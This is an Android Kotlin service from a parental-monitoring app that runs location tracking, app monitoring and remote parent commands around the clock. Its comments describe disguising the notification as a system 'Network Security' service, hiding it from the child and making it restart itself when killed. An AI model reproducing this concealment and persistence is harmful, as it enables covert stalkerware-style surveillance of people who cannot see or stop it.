package com.guardianai.agent.services

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat

/**
 * GuardianForegroundService
 *
 * The heart of GuardianAI — runs 24/7 invisibly.
 *
 * Ghost Shield Notification Strategy:
 *  - Channel importance = IMPORTANCE_MIN (completely silent, no sound, no vibration)
 *  - No badge on launcher icon
 *  - Notification text = "Network Security" (looks like a system service)
 *  - If Device Owner: notification can be fully suppressed via DevicePolicyManager
 *
 * The service automatically restarts if killed via:
 *  - START_STICKY: Android restarts it automatically
 *  - JobScheduler watchdog: checks every 15 minutes
 *  - BootReceiver: restarts on device boot
 */
class GuardianForegroundService : Service() {

    companion object {
        const val TAG = "GuardianService"
        const val CHANNEL_ID = "guardian_protection"
        const val NOTIFICATION_ID = 1001

        fun start(context: Context) {
            val intent = Intent(context, GuardianForegroundService::class.java)
            context.startForegroundService(intent)
        }

        fun stop(context: Context) {
            val intent = Intent(context, GuardianForegroundService::class.java)
            context.stopService(intent)
        }
    }

    private var appMonitor: AppMonitorService? = null
    private var screenReceiver: BroadcastReceiver? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildSilentNotification())
        startSubServices()
        registerScreenReceiver()
        Log.i(TAG, "✅ GuardianForegroundService started")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // Auto-restart if killed by system
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        Log.w(TAG, "Service destroyed — scheduling immediate restart")
        try { unregisterReceiver(screenReceiver) } catch (_: Exception) {}
        // Immediately restart self
        val restartIntent = Intent(this, GuardianForegroundService::class.java)
        startForegroundService(restartIntent)
    }

    // ─── NOTIFICATION (Silent — child cannot hear/feel it) ────────────────────

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Device Protection",     // Name visible in Settings (looks legitimate)
            NotificationManager.IMPORTANCE_MIN  // Lowest possible — completely silent
        ).apply {
            description = "System network protection service"
            setShowBadge(false)       // No badge on app icon
            enableLights(false)       // No notification LED
            enableVibration(false)    // No vibration
            setSound(null, null)      // No sound
            lockscreenVisibility = Notification.VISIBILITY_SECRET  // Hidden on lock screen
        }
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.createNotificationChannel(channel)
    }

    private fun buildSilentNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Network Security")          // Looks like a system service
            .setContentText("Device protection active")   // Innocuous text
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setPriority(NotificationCompat.PRIORITY_MIN) // Minimum priority
            .setSilent(true)
            .setOngoing(true)          // Cannot be swiped away by child
            .setShowWhen(false)        // No timestamp
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // Hidden on lock screen
            .build()
    }

    // ─── SUB-SERVICES ─────────────────────────────────────────────────────────

    private fun startSubServices() {
        // App monitor (silent app blocking)
        AppMonitorService.start(this)
        Log.i(TAG, "AppMonitorService started")

        // Location service
        val locationIntent = Intent(this, LocationService::class.java)
        startForegroundService(locationIntent)
        Log.i(TAG, "LocationService started")

        // Command poller (listens for parent commands)
        val commandIntent = Intent(this, CommandPollerService::class.java)
        startForegroundService(commandIntent)
        Log.i(TAG, "CommandPollerService started")
    }

    // ─── SCREEN STATE RECEIVER ────────────────────────────────────────────────

    private fun registerScreenReceiver() {
        screenReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                when (intent.action) {
                    Intent.ACTION_SCREEN_ON -> {
                        Log.d(TAG, "Screen ON")
                        // Notify SOS system
                    }
                    Intent.ACTION_SCREEN_OFF -> {
                        Log.d(TAG, "Screen OFF")
                        // SOS power button detection handled here
                    }
                    Intent.ACTION_PACKAGE_ADDED -> {
                        val pkg = intent.data?.schemeSpecificPart ?: return
                        Log.i(TAG, "New app installed: $pkg")
                        // Alert parent about new app installation
                        onNewAppInstalled(pkg)
                    }
                    Intent.ACTION_PACKAGE_REMOVED -> {
                        val pkg = intent.data?.schemeSpecificPart ?: return
                        Log.d(TAG, "App removed: $pkg")
                    }
                }
            }
        }

        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_PACKAGE_ADDED)
            addAction(Intent.ACTION_PACKAGE_REMOVED)
            addDataScheme("package")
        }
        registerReceiver(screenReceiver, filter)
    }

    private fun onNewAppInstalled(packageName: String) {
        // Log and alert parent — runs in background
        Thread {
            try {
                val childId = getSharedPreferences("guardian_config", Context.MODE_PRIVATE)
                    .getString("child_id", null) ?: return@Thread
                SupabaseLogger.logAlert(
                    childId = childId,
                    type = "new_app",
                    severity = "warning",
                    title = "New App Installed",
                    body = "A new app was installed: $packageName. Review and block if needed."
                )
            } catch (e: Exception) {
                Log.e(TAG, "Alert error", e)
            }
        }.start()
    }
}
